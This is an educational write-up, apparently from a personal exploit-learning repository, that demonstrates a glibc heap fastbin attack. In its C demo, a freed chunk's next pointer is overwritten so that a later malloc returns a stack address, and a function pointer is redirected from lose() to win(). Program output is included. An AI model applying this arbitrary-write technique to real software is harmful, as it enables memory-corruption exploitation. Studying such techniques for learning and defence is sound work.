# Exploits
## Heap Fastbin Attack
## Requirements to undestand : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md (fastbins)
Please before reading this article i NEED you to understand how a fastbin works (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md)  
So if you don't know, take a look  
## Insight
The exploit we're gonna see here is an arbiratry write exploit that so we can write to any address with it without changing anything directly from this address  
Let's have this C code to start :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    unsigned long* ptr1 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
    unsigned long* ptr2 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
    unsigned long* ptr3 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f

    printf("ptr1 -> 0x%x => 0x%x\n", ptr1, *ptr1);
    printf("ptr2 -> 0x%x => 0x%x\n", ptr2, *ptr2);
    printf("ptr3 -> 0x%x => 0x%x\n", ptr3, *ptr3);

    memset(ptr1, 'A', 0x20);
    memset(ptr2, 'B', 0x20);
    memset(ptr3, 'C', 0x20);

    printf("Freeing pointers\n");
    free(ptr1);
    free(ptr2);
    free(ptr3);
}
I set the pointers to be unsigned long* so then we can write an unsigned long (address) to the value they contain
```
So we said (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md) that here `ptr1`, `ptr2` and `ptr3` are added to a linked list, the fastbin  
After the frees, so it will look like that :
```
Fastbins[idx=0, size=0x10] 
←  Chunk(addr=0x405010, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x4052a0 (ptr1), size=0x20, flags=PREV_INUSE) => 0x000000 (data not metadata) POINTS TO END OF LINKED LIST
←  Chunk(addr=0x4052d0 (ptr2), size=0x20, flags=PREV_INUSE) => 0x4052a0 (data) POINTS TO PTR1
←  Chunk(addr=0x405300 (ptr3), size=0x20, flags=PREV_INUSE) => 0x0052d0 (data) POINTS TO PTR2
```
We said that if we allocate new pointers as in order `ptr4`, `ptr5` and `ptr6` that have the same size `0x20`, then :
```
`ptr4` took the address of `ptr1`  
`ptr5` took the address that `ptr3` contains  
and `ptr6` took the address that `ptr2` contains  
```
In other terms, the value that contans `ptr2` controls where the next chunk will be allocated  
But who said this address has to be on the heap ? Let's try something crazy, let's allocate a heap chunk in any address, in the stack, so let's change the code :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win()
{
    printf("The process of winning\n");
}
void lose()
{
    printf("The voice in my head says I’ll never win\n");
}

int main(void)
{
    unsigned long *ptr1, *ptr2, *ptr3;

    ptr1 = malloc(0x30);
    ptr2 = malloc(0x30);
    ptr3 = malloc(0x30);

    printf("ptr1: %lx\n", ptr1);
    printf("ptr2: %lx\n", ptr2);
    printf("ptr3: %lx\n", ptr3);

    void (*fun_ptr)() = &lose;

    printf("Function pointer: %lx@%lx\n", fun_ptr, &fun_ptr);

    memset(ptr1, 'A', 0x8);
    memset(ptr2, 'A', 0x8);
    memset(ptr3, 'A', 0x8);

    printf("ptr1 => %lx\n", *ptr1);
    printf("ptr2 => %lx\n", *ptr2);
    printf("ptr3 => %lx\n", *ptr3);

    free(ptr1);
    free(ptr2);
    free(ptr3);

    printf("ptr1@%lx => %lx\n", ptr1, *ptr1);
    printf("ptr2@%lx => %lx\n", ptr2, *ptr2);
    printf("ptr3@%lx => %lx\n\n", ptr3, *ptr3);

    *ptr2 = (unsigned long)&fun_ptr;

    unsigned long *ptr4, *ptr5, *ptr6;

    ptr4 = malloc(0x30);
    ptr5 = malloc(0x30);
    ptr6 = malloc(0x30);

    printf("ptr4 : %p\n", ptr4);
    printf("ptr5 : %p\n", ptr5);
    printf("ptr6 : %p => %lx\n", ptr6, (int)*ptr6);

    *ptr6 = (unsigned long)&win;

    fun_ptr();
}
```
So i created 2 new functions, `lose()` and `win()`, the goal is to call win  
I added a function pointer `fun_ptr` that we want to overwrite, after the frees i set the value that ptr2 contains to the address of `fun_ptr` so then it will be overwritten    
Then after the new allocations i set `ptr6` to the value we want our `fun_ptr` to be set to, so since we want to jump to `win`, i set it to the address of `win`  
Now if we run it :
```c
ptr1: 4052a0
ptr2: 4052e0
ptr3: 405320
Function pointer: 401175@7fffffffded8
ptr1 => 4141414141414141
ptr2 => 4141414141414141
ptr3 => 4141414141414141
ptr1@4052a0 => 0
ptr2@4052e0 => 4052a0
ptr3@405320 => 4052e0

ptr4 : 0x405320
ptr5 : 0x4052e0
ptr6 : 0x7fffffffded8 => 401175
The process of winning
```
We successfully called `win()` ! So we can use this technique to overwrite any data (any address value) !
Thanks for reading
